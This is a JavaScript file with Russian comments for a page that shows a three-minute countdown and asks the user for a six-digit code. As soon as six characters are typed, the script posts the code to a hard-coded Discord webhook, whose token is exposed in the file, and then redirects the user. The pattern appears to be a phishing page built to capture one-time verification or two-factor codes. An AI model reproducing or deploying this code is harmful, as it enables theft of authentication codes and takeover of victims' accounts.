let timeLeft = 180; // 3 минуты в секундах
const timerElement = document.getElementById('timer');
const codeInput = document.getElementById('code');
const loader = document.getElementById('loader');

const countdown = setInterval(() => {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    
    if (timeLeft <= 0) {
        clearInterval(countdown);
        alert('Время ожидания истекло!');
        codeInput.disabled = true; // Отключаем поле ввода после истечения времени
    }
    
    timeLeft--;
}, 1000);

codeInput.addEventListener('input', function() {
    const code = codeInput.value;

    if (code.length === 6) { // Проверяем, что код состоит из 6 символов
        const webhookUrl = 'https://discordapp.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv'; // Замените на свой вебхук

        loader.style.display = 'block'; // Показываем анимацию загрузки

        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `Введенный код: ${code}` }),
        }).then(response => {
            loader.style.display = 'none'; // Скрываем анимацию загрузки
            if (response.ok) {
                console.log('Код отправлен успешно!');
                alert('Код отправлен успешно!');
                window.location.href = 'loader.html'; // Переход на страницу success.html
            } else {
                console.error('Ошибка при отправке кода.');
                alert('Ошибка при отправке кода.');
            }
        }).catch(error => {
            loader.style.display = 'none'; // Скрываем анимацию загрузки
            console.error('Ошибка сети:', error);
            alert('Ошибка сети. Пожалуйста, попробуйте еще раз.');
        });
    }
});
